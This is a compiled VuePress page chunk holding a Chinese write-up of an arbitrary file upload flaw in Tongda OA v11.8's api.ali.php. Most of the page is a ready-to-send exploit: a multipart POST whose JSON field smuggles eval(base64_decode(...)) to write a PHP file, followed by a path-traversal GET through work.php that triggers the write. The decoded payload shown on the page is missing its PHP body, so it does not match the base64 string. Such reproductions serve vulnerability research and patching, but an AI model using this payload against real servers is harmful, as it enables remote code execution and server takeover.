import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件控制服务器</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>通达OA v11.8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201543147.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>向 api.ali.php 发送请求包</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /mobile/api/api.ali.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 422
Content-Type: multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae
Accept-Encoding: gzip

--502f67681799b07e4de6b503655f5cae
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;fb6790f4.json&quot;
Content-Type: application/octet-stream

{&quot;modular&quot;:&quot;AllVariable&quot;,&quot;a&quot;:&quot;ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==&quot;,&quot;dataAnalysis&quot;:&quot;{\\&quot;a\\&quot;:\\&quot;錦&#39;,$BackData[dataAnalysis] =&gt; eval(base64_decode($BackData[a])));/*\\&quot;}&quot;}
--502f67681799b07e4de6b503655f5cae--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>参数a base解码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==
file_put_contents(&#39;../../fb6790f4.php&#39;,&#39;&#39;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201543536.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再发送GET请求写入文件，页面返回<code>+OK</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2109/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中请求中对 2109 为 年月,路径为 <code>/fb6790f4.php,</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201544984.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),s=[d];function l(c,o){return a(),i("div",null,s)}const p=e(t,[["render",l],["__file","通达OA v11.8 api.ali.php 任意文件上传漏洞.html.vue"]]);export{p as default};
